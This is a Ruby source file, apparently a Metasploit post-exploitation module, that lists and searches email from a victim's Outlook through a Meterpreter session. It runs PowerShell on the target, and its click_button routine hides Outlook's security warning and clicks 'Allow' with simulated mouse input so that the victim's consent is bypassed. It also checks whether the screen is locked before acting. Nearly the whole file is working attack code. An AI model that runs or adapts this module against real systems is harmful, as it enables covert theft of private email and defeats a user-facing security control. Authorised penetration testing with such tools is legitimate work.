##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Powershell

  A_HASH = { 'en_US' => 'Allow', 'nl_NL' => 'Toestaan', 'de_DE' => 'Erteilen', 'de_AT' => 'Erteilen' }
  ACF_HASH = { 'en_US' => 'Allow access for', 'nl_NL' => 'Toegang geven voor', 'de_DE' => "Zugriff gew\xc3\xa4hren f\xc3\xbcr", 'de_AT' => "Zugriff gew\xc3\xa4hren f\xc3\xbcr" }

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Outlook Email Messages',
        'Description' => %q{
          This module allows reading and searching email messages from the local
          Outlook installation using PowerShell. Please note that this module is
          manipulating the victims keyboard/mouse.  If a victim is active on the target
          system, he may notice the activities of this module. Tested on Windows 8.1
          x64 with Office 2013.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Wesley Neelen <security[at]forsec.nl>' ],
        'References' => [ 'URL', 'https://forsec.nl/2014/11/reading-outlook-using-metasploit' ],
        'Platform' => [ 'win' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Actions' => [
          [ 'LIST', { 'Description' => 'Lists all folders' } ],
          [ 'SEARCH', { 'Description' => 'Searches for an email' } ]
        ],
        'DefaultAction' => 'LIST',
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_sys_config_sysinfo
              stdapi_ui_get_idle_time
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('FOLDER', [ false, 'The e-mailfolder to read (e.g. Inbox)' ]),
        OptString.new('KEYWORD', [ false, 'Search e-mails by the keyword specified here' ]),
        OptString.new('A_TRANSLATION', [ false, 'Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
        OptString.new('ACF_TRANSLATION', [ false, 'Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])
      ]
    )
  end

  def execute_outlook_script(command)
    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'outlook.ps1'))
    psh_script = base_script << command
    compressed_script = compress_script(psh_script)
    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
    while (d = cmd_out.channel.read)
      print(d.to_s)
    end
    currentidle = session.ui.idle_time
    vprint_status("System has currently been idle for #{currentidle} seconds")
  end

  # This function prints a listing of available mailbox folders
  def list_boxes
    command = 'List-Folder'
    execute_outlook_script(command)
  end

  # This functions reads Outlook using powershell scripts
  def read_emails(folder, keyword, atrans, acftrans)
    view = framework.threads.spawn('ButtonClicker', false) do
      click_button(atrans, acftrans)
    end
    command = "Get-Emails \"#{keyword}\" \"#{folder}\""
    execute_outlook_script(command)
  end

  # This functions clicks on the security notification generated by Outlook.
  def click_button(atrans, acftrans)
    sleep 1
    hwnd = client.railgun.user32.FindWindowW(nil, 'Microsoft Outlook')
    if hwnd != 0
      hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, 'Button', "&#{acftrans}")
      client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
      client.railgun.user32.MoveWindow(hwnd['return'], 150, 150, 1, 1, true)
      hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, 'Button', atrans.to_s)
      client.railgun.user32.SetActiveWindow(hwndChild['return'])
      client.railgun.user32.SetForegroundWindow(hwndChild['return'])
      client.railgun.user32.SetCursorPos(150, 150)
      client.railgun.user32.mouse_event(0x0002, 150, 150, nil, nil)
      client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
    else
      print_error('Error while clicking on the Outlook security notification. Window could not be found')
    end
  end

  # Main method
  def run
    folder	= datastore['FOLDER']
    keyword = datastore['KEYWORD'].to_s
    allow	= datastore['A_TRANSLATION']
    allow_access_for = datastore['ACF_TRANSLATION']
    langNotSupported = true

    # OS language check
    sysLang = client.sys.config.sysinfo['System Language']
    A_HASH.each do |key, _val|
      next unless sysLang == key

      langNotSupported = false
      atrans = A_HASH[sysLang]
      acftrans = ACF_HASH[sysLang]
    end

    if allow && allow_access_for
      atrans = allow
      acftrans = allow_access_for
    elsif langNotSupported == true
      fail_with(Failure::Unknown, 'System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)')
    end

    # Outlook installed
    @key_base = 'HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676'
    outlookInstalled = registry_getvaldata("#{@key_base}\\", 'NextAccountID')

    if !outlookInstalled.nil?
      if outlookInstalled != 0
        print_good 'Outlook is installed'
      else
        fail_with(Failure::Unknown, 'Outlook is not installed')
      end
    end

    # Powershell installed check
    if have_powershell?
      print_good('PowerShell is installed.')
    else
      fail_with(Failure::Unknown, 'PowerShell is not installed')
    end

    # Check whether target system is locked
    locked = client.railgun.user32.GetForegroundWindow()['return']
    if locked == 0
      fail_with(Failure::Unknown, "Target system is locked. This post module cannot click on Outlook's security warning when the target system is locked.")
    end

    case action.name
    when 'LIST'
      print_good('Available folders in the mailbox: ')
      list_boxes
    when 'SEARCH'
      read_emails(folder, keyword, atrans, acftrans)
    else
      print_error("Unknown Action: #{action.name}")
    end
  end
end
